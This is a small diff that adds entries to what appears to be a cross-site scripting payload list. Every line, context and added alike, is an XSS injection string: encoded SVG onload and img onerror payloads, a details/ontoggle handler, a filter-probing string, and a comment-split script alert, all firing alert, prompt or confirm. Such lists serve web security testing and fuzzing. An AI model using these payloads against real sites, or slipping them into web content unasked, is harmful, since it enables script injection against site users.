@@ -5,3 +5,9 @@
 6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
 
 &quot;&gt;&lt;img src=x onerror=confirm(1);&gt;
+
+">'><details/open/ontoggle=confirm('XSS')>
+
+'';!--"<XSS>=&{()}
+
+<!--><script>alert/**/()/**/</script>
